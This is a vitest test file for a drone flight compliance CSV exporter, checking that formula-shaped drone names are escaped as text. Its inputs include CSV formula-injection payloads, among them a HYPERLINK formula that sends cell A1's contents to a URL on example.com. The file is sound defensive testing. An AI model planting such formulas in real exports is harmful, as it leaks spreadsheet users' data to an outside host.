/**
 * The compliance CSV is opened in spreadsheets, so a text cell must never be
 * evaluated as a formula, while numbers stay numbers.
 *
 * @license GPL-3.0-only
 */

import { describe, it, expect } from "vitest";
import type { FlightRecord, OperatorProfile } from "@/lib/types";
import { JURISDICTIONS } from "@/lib/compliance/jurisdictions";
import { exportComplianceCsv } from "@/lib/compliance/csv-exporter";

function flight(droneName: string): FlightRecord {
  return {
    id: "f1",
    droneId: "d1",
    droneName,
    date: 1_741_000_000_000,
    startTime: 1_741_000_000_000,
    endTime: 1_741_000_600_000,
    duration: 600,
    distance: 800,
    maxAlt: 40,
    maxSpeed: 8,
    waypointCount: 0,
    status: "completed",
    updatedAt: 1_741_000_600_000,
  };
}

const operator: OperatorProfile = { operatorName: "Example Operator" };

/** Assert the droneName cell (second column of the first data row) is written as `cell`. */
function expectDroneCell(name: string, cell: string): void {
  const row = exportComplianceCsv([flight(name)], JURISDICTIONS.IN_DGCA, operator, {}).split("\n")[1];
  const prefix = `f1,${cell},`;
  expect(row.slice(0, prefix.length)).toBe(prefix);
}

describe("compliance CSV cells", () => {
  it("keeps a formula-shaped name as text", () => {
    expectDroneCell('=HYPERLINK("http://example.com/?"&A1,"x")', `"'=HYPERLINK(""http://example.com/?""&A1,""x"")"`);
    expectDroneCell("+cmd", "'+cmd");
    expectDroneCell("-2+3", "'-2+3");
    expectDroneCell("@SUM(A1)", "'@SUM(A1)");
    expectDroneCell("\tx", "'\tx");
  });

  it("quotes a carriage return", () => {
    expectDroneCell("a\rb", '"a\rb"');
  });

  it("leaves plain names and negative numbers alone", () => {
    expectDroneCell("Alpha", "Alpha");
    expectDroneCell("-73.5", "-73.5");
  });
});
